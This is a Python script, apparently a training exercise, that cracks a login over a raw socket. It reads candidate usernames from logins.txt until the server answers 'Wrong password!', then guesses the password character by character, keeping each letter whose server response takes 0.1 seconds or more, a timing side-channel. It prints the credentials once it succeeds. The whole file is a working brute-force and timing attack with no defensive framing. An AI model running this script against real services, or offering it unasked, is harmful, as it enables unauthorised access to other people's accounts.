import json
import os
import socket
import sys
import time

from string import ascii_letters, digits


def connections(host: str, port: str):
    with socket.socket() as client_socket:
        address = (host, int(port))
        client_socket.connect(address)
        letters = ascii_letters + digits
        password = ' '
        path = os.path.join(os.getcwd(), r'logins.txt')
        with open(path, 'r', encoding='utf-8') as logins:
            for login in logins:
                login = login.strip()
                mess_login = {'login': login, 'password': password}
                data = json.dumps(mess_login).encode()
                client_socket.send(data)
                response = json.loads(client_socket.recv(1024).decode('utf-8'))
                if response['result'] == 'Wrong password!':
                    break
        password = ''
        flag = True
        while flag:
            for letter in letters:
                tmp = password + letter
                mess_pass = {'login': login, 'password': tmp}
                data = json.dumps(mess_pass).encode()
                client_socket.send(data)
                start = time.time()
                response = json.loads(client_socket.recv(1024).decode())
                end = time.time()
                if response['result'] == 'Connection success!':
                    flag = False
                    print(json.dumps(mess_pass))
                    break
                final = end - start
                if final >= 0.1:
                    password = tmp
                    break


def main():
    args = sys.argv
    connections(args[1], args[2])


if __name__ == '__main__':
    main()
